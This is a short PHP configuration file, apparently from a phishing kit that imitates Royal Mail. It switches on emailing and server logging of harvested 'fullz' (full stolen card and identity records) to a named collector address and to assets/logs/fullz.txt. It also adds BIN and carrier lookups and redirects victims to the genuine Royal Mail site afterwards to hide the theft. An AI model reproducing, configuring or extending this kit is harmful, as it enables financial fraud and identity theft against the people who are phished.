<?php
//Systems:

// - Carrier lookup in results (Already activated)
// - Bin List (Change '0' from $binList to '1' to activate)
// - Send results via email (Change '0' from $sendEmail to '1' to activate)
// - Save results on server (Change '0' from $saveFile to '1' to activate) => assets/logs/fullz.txt
// - Save results in separated files clased by BIN (Change '0' from $binSave to '1' to activate)


$saveFile = 1;
$sendEmail = 1;
$binList = 1;
$binSave = 0;




$to = "halibin1@yandex.com"; //Your e-mail address to receive fullz
$ExitLink = "https://royalmail.com/"; // Real site via google redirect
?>
